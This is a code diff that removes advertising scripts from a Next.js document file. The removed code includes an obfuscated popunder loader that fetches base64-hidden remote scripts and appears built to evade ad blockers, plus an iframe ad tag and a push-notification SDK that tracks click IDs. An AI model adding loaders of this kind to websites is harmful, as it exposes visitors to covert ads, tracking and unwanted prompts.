@@ -111,51 +111,6 @@ export default class MyDocument extends Document {
             `}
           </Script>
 
-          <Script data-cfasync="false" strategy="afterInteractive">
-            {`
-            atOptions = {
-            'key' : 'db286534355560bb44457576fd0665fb',
-            'format' : 'iframe',
-            'height' : 600,
-            'width' : 160,
-            'params' : {}
-            };
-            `}
-          </Script>
-
-          <Script data-cfasync="false" strategy="afterInteractive" src="//cheesydrinks.com/db286534355560bb44457576fd0665fb/invoke.js"></Script>
-
-          <Script data-cfasync="false" strategy="afterInteractive">
-            {`
-
-           (function(){var l=window,y="bb8fbe99f395a811088d6fb81ae38615",u=[["siteId",265-524-804-943*332+5409065],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default","PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0nLy9wbDIzNjE1Mjc0LmhpZ2hyZXZlbnVlbmV0d29yay5jb20vMDYvNDEvZGQvMDY0MWRkZWZhYWJmMzBjOWU3NmJmMWQ1Zjc4YmEzZGEuanMnPjwvc2NyaXB0Pg=="],["defaultPerDay",0],["topmostLayer","auto"]],e=["d3d3LmJsb2NrYWRzbm90LmNvbS9nYmVhdXRpZnkubWluLmNzcw==","ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC9PbnZSSy93anNmZWF0LW1pbi5qcw=="],s=-1,a,p,v=function(){clearTimeout(p);s++;if(e[s]&&!(1746195748000<(new Date).getTime()&&1<s)){a=l.document.createElement("script");a.type="text/javascript";a.async=!0;var d=l.document.getElementsByTagName("script")[0];a.src="https://"+atob(e[s]);a.crossOrigin="anonymous";a.onerror=v;a.onload=function(){clearTimeout(p);l[y.slice(0,16)+y.slice(0,16)]||v()};p=setTimeout(v,5E3);d.parentNode.insertBefore(a,d)}};if(!l[y]){try{Object.freeze(l[y]=u)}catch(e){}v()}})();
-
-            `}
-          </Script>
- <Script data-cfasync="false" strategy="afterInteractive">
-            {`
-  (function() {
-      const url = new URL(window.location.href);
-      const clickID = url.searchParams.get("click_id");
-      const sourceID = url.searchParams.get("source_id");
-
-      const s = document.createElement("script");
-      s.dataset.cfasync = "false";
-      s.src = "https://push-sdk.com/f/sdk.js?z=1209865";
-      s.onload = (opts) => {
-          opts.zoneID = 1209865;
-          opts.extClickID = clickID;
-          opts.subID1 = sourceID;
-          opts.actions.onPermissionGranted = () => {};
-          opts.actions.onPermissionDenied = () => {};
-          opts.actions.onAlreadySubscribed = () => {};
-          opts.actions.onError = () => {};
-      };
-      document.head.appendChild(s);
-  })()
-  `}
-</Script>
-
           {/*
           <Script src="https://unpkg.com/magic-snowflakes/dist/snowflakes.min.js" strategy="afterInteractive" />
           <Script strategy="lazyOnload">
